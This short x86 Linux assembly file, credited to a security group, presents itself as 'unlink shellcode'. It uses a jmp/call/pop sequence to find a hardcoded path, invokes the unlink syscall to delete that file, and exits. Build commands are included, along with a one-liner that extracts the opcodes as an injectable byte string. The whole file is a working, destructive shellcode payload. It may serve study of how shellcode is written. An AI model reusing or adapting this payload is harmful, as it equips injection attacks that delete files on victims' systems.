;author: kwrnel - p0cl4bs
;description: unlink shellcode x86
;date: 06-12-2015
;compile:
;	$ nasm -f elf32 unlink_x86.asm
;	$ ld unlink_x86.o -o unlink_x86 -m elf_i386
;get opcodes: for x in `objdump -d unlink_x86|tr '\t' '_'|awk -F '_' '{print $2'}|tr ' ' '\n'|egrep '^[0-9a-f]{2}$'`; do echo -n '\x'$x; done


section .text
	global _start

_start:
	jmp short filename

main:
	pop esi
	mov ebx, esi
	mov al, 0xa
	int 0x80
	
	mov al, 1
	int 0x80

filename:
	call main
	db "/home/kwrnel/asm/teste.txt",0